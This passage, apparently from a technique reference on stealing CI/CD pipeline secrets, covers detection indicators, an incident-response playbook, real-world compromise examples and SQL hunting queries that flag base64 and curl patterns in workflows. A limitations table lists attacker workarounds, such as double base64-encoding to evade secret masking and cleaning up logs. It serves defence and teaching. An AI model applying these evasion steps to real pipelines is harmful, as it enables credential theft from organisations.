          # Use temporary credentials from OIDC
          # No ${{ secrets.AWS_KEY }} needed!
```

---

### B. Detection (Monitoring)

| Indicator | Detection Method | Response |
|---|---|---|
| **Malicious workflow creation** | Pipeline file audit logs; suspicious task names | Block workflow; investigate creator |
| **Secret exfiltration** | Network DLP; HTTP requests to external IPs; base64 patterns in logs | Kill pipeline; revoke credentials |
| **Unusual pipeline execution** | Execution outside normal hours; different runner; unusual task combination | Investigate execution context |
| **Credential access** | Azure DevOps API logs; GitHub API audit; GitLab admin logs | Review access; revoke if unauthorized |

---

## 11. INCIDENT RESPONSE PLAYBOOK

**Phase 1: Containment (T+0-15 minutes)**
```
[ ] Revoke all secrets/PATs potentially exposed
[ ] Delete malicious workflow files from all branches
[ ] Block attacker account (revoke PAT, disable account)
[ ] Disable affected service connections (Azure, AWS, etc.)
[ ] Preserve evidence (pipeline logs, git history, audit logs)
```

**Phase 2: Eradication (T+15-60 minutes)**
```
[ ] Rotate all cloud credentials used by CI/CD
[ ] Enable OIDC for future deployments
[ ] Implement branch protection rules
[ ] Enable secret masking/redaction in logs
[ ] Audit all pipeline files for additional malicious code
[ ] Review recent pipeline executions for unauthorized actions
```

**Phase 3: Recovery (T+60-240 minutes)**
```
[ ] Reissue all service principals and PATs
[ ] Force password reset for accounts with pipeline access
[ ] Deploy updated pipelines with security controls
[ ] Enable comprehensive audit logging for pipelines
[ ] Configure SIEM rules for CI/CD threat detection
```

---

## 12. RELATED ATTACK CHAINS

| Technique ID | Name | Relationship |
|---|---|---|
| **T1110** | Brute Force | Compromise credentials to gain initial pipeline access |
| **T1134** | Token Impersonation | Impersonate service principal via stolen credentials |
| **T1199** | Trusted Relationship | Supply chain: push malicious code via CI/CD |
| **T1565** | Data Destruction | Delete logs/audit trails to cover attack |
| **T1098** | Account Manipulation | Create backdoor service account using stolen credentials |
| **T1548.002** | Privilege Escalation | Use CI/CD credentials with high permissions |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: GhostAction Campaign (September 2025)

**Scope:** 3,325 secrets stolen from 817 repositories; 327 compromised GitHub users

**Attack Chain:**
- Compromised GitHub accounts via phishing or password reuse
- Injected malicious workflows ("Add Github Actions Security workflow")
- Double base64-encoding to bypass secret masking
- Exfiltrated 3,325 secrets: PyPI, npm, DockerHub, AWS keys, GitHub PATs
- Supply chain impact: Malicious packages could be published to package registries

**Response:**
- GitGuardian disclosed; created issues in 573 repos
- Notified package registries of compromised credentials
- 100+ repositories reverted malicious changes within 24 hours

**Reference:** [GitGuardian: GhostAction Campaign](https://www.gitguardian.com)

---

### Example 2: GitHub Actions Compromise (March 2025)

**Scope:** 23,000+ repositories affected; popular GitHub Action backdoored

**Attack Vector:**
- Compromised GitHub Action used by 23,000+ repos
- Injected Python code to extract credentials from runner memory
- Used regex to identify AWS keys, GitHub PATs, npm tokens
- Stored results in workflow logs for attacker access

**Impact:**
- AWS credentials disclosed, leading to infrastructure compromise
- GitHub PATs used for cross-cloud lateral movement
- Private keys and database credentials extracted

**Reference:** [StepSecurity: GitHub Action Compromise](https://www.stepsecurity.io/)

---

### Example 3: Synacktiv Red Team Assessment

**Client:** Large enterprise with Azure DevOps

**Attack Chain:**
1. Compromised developer account (weak password)
2. Used account to create malicious Azure pipeline
3. Nord-stream extracted variable group secrets
4. Obtained Azure service principal keys
5. Pivoted to Azure subscription; accessed Key Vaults
6. Extracted additional credentials (database, APIs, 3rd-party services)

**Result:** Complete infrastructure compromise via stolen CI/CD credentials

**Reference:** [Synacktiv: CI/CD Secrets Extraction, Tips and Tricks](https://www.synacktiv.com/publications/cicd-secrets-extraction-tips-and-tricks)

---

## 14. LIMITATIONS & MITIGATIONS

### Limitations of Technique

| Limitation | Details | Workaround |
|---|---|---|
| **Secret masking** | GitHub/Azure redact known secrets in logs | Double base64-encoding; transform output (reverse, compress) |
| **Branch protection** | Cannot modify protected branch workflows | Create new branch with workflow; use PR if enabled |
| **OIDC/short-lived tokens** | No long-lived secrets to steal | Steal refresh tokens; use to obtain new temporary credentials |
| **Read-only logs** | Logs immediately archived/immutable | Exfil during execution; extract before archival |
| **Audit logging** | All actions logged | Clean up logs (requires admin/root access); exfil quietly |

---

## 15. DETECTION & INCIDENT RESPONSE

### Detection Strategies

**Real-Time Indicators:**
1. Workflow file creation with suspicious patterns (base64, exfil)
2. Pipeline execution at unusual times or by unusual users
3. Base64-encoded strings in pipeline logs matching secret patterns
4. HTTP/DNS requests to attacker-controlled infrastructure
5. Unusual service connection/variable group access

**Hunting Queries:**
```sql
-- Find workflows with base64-encoding patterns
SELECT workflow_file, created_by, created_timestamp
FROM github_workflows
WHERE content LIKE '%base64%' 
  AND content LIKE '%base64%'  -- Double encoding
  AND (content LIKE '%curl%' OR content LIKE '%http%')
ORDER BY created_timestamp DESC

-- Find uncommon pipeline executions
SELECT pipeline_name, executor, execution_time, duration
FROM azuredevops_pipelines
WHERE executor NOT IN (SELECT normal_executors FROM baseline)
  AND execution_time NOT IN (normal_execution_hours)
ORDER BY execution_time DESC
```

---

## 16. REFERENCES & ADDITIONAL RESOURCES

### Official Documentation
- [GitHub Actions Security](https://docs.github.com/en/actions/security-for-github-actions)
- [Azure Pipelines Security](https://docs.microsoft.com/en-us/azure/devops/pipelines/security)
- [GitLab CI/CD Security](https://docs.gitlab.com/ee/ci/secrets/)

### Security Research
- [MITRE ATT&CK T1528](https://attack.mitre.org/techniques/T1528/)
- [Synacktiv: CI/CD Secrets Extraction](https://www.synacktiv.com/publications/cicd-secrets-extraction-tips-and-tricks)
- [Wiz CIRT: GitHub PAT to Cloud Control Plane](https://www.wiz.io/blog/github-attacks-pat-control-plane)

### Tools & Automation
- [Nord-Stream GitHub](https://github.com/synacktiv/nord-stream)
- [Legitify](https://github.com/legit-labs/legitify)
- [Poutine](https://github.com/boostsecurityio/poutine)

---
